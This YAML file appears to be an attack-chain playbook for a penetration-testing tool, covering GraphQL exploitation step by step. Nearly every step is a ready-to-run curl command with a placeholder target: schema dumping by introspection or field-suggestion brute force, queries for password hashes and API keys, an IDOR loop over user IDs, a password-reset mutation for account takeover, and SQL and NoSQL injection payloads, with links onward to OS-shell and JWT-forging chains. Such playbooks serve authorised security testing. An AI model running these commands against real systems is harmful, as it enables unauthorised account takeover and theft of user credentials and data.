id: graphql-introspection-injection
name: "Web — GraphQL introspection + injection chain"
description: >
  GraphQL APIs frequently leave introspection enabled in production →
  full schema dump → discover mutations and sensitive query fields →
  IDOR / authorization bypass / injection on resolvers backed by SQL/NoSQL.
tags: [web, graphql, introspection, idor, injection]
difficulty: medium

inputs:
  - name: target_url
    description: "GraphQL endpoint (usually /graphql, /api/graphql, /v1/graphql)."
    required: true

steps:
  - id: detect_graphql
    name: "Confirm GraphQL endpoint"
    inline_command: |
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{__typename}"}'
    inputs:
      url: "${target_url}"
    notes: |
      Response `{"data":{"__typename":"Query"}}` → confirmed GraphQL.
      Other indicators: requests with `query`/`variables` in body, or
      Apollo/Hasura/Postgraphile in response headers.

  - id: introspection_dump
    name: "Dump the full schema via introspection"
    inline_command: |
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d @<(echo '{"query":"query IntrospectionQuery {__schema {queryType {name} mutationType {name} subscriptionType {name} types {...FullType} directives {name description locations args {...InputValue}}} } fragment FullType on __Type {kind name description fields(includeDeprecated: true) {name description args {...InputValue} type {...TypeRef} isDeprecated deprecationReason} inputFields {...InputValue} interfaces {...TypeRef} enumValues(includeDeprecated: true) {name description isDeprecated deprecationReason} possibleTypes {...TypeRef}} fragment InputValue on __InputValue {name description type {...TypeRef} defaultValue} fragment TypeRef on __Type {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name}}}}}}}}"}')
    inputs:
      url: "${target_url}"
    notes: |
      Save the response to schema.json. Use a UI like InQL (Burp plugin)
      or GraphQL Voyager to navigate visually. The killer fields are in
      Mutation — they're the verbs (createUser, resetPassword, etc.).

  - id: clairvoyance_disabled
    name: "Introspection blocked? Try clairvoyance / field-suggestion brute"
    inline_command: |
      pip install clairvoyance
      clairvoyance '<url>' -w /usr/share/wordlists/graphql/google-10000-english.txt -o schema.json
    inputs:
      url: "${target_url}"
    notes: |
      GraphQL returns helpful errors like "Did you mean 'user'?" — clairvoyance
      exploits that to rebuild the schema even with introspection off.

  - id: enumerate_queries
    name: "Enumerate sensitive queries (users, secrets, internal_*)"
    inline_command: |
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{ users { id email role passwordHash } }"}'
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{ adminUsers { id email } }"}'
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{ internalDebugInfo }"}'
    inputs:
      url: "${target_url}"
    notes: |
      Many GraphQL APIs forget per-field authorization. Even when /api/users
      checks roles, the same fields exposed via GraphQL often don't.

  - id: idor_user_lookup
    name: "IDOR: fetch arbitrary user data"
    inline_command: |
      for id in {1..100}; do
        curl -s -X POST '<url>' -H 'Content-Type: application/json' \
          -d "{\"query\":\"{ user(id: $id) { email passwordHash apiKey } }\"}"
      done
    inputs:
      url: "${target_url}"

  - id: mutation_takeover
    name: "Hit dangerous mutations (passwordReset / promoteUser)"
    inline_command: |
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"mutation { resetPassword(userId: 1, newPassword: \"pwn\") { token } }"}'
    inputs:
      url: "${target_url}"
    notes: |
      Common forgotten authorization → admin mutations callable by any
      authenticated (or even unauthenticated!) user.

  - id: nosql_injection_via_args
    name: "NoSQL / SQL injection on resolver arguments"
    inline_command: |
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{ user(id: \"1 OR 1=1--\") { email } }"}'
      curl -X POST '<url>' -H 'Content-Type: application/json' \
        -d '{"query":"{ user(filter: {name: {$ne: \"\"}}) { email } }"}'
    inputs:
      url: "${target_url}"

references:
  - title: "PortSwigger — GraphQL attacks"
    url:   "https://portswigger.net/web-security/graphql"
  - title: "HackTricks — GraphQL"
    url:   "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html"

next_chains:
  - chain: nosql-injection
    when:   'NoSQL injection successful via args'
    reason: 'Pivot to full NoSQL exploitation.'
  - chain: sqli-to-os-shell
    when:   'SQL injection successful via args'
    reason: 'Full SQLi → OS shell.'
  - chain: jwt-attacks
    when:   'mutation returns JWT token'
    reason: 'Stolen token → forge stronger ones.'
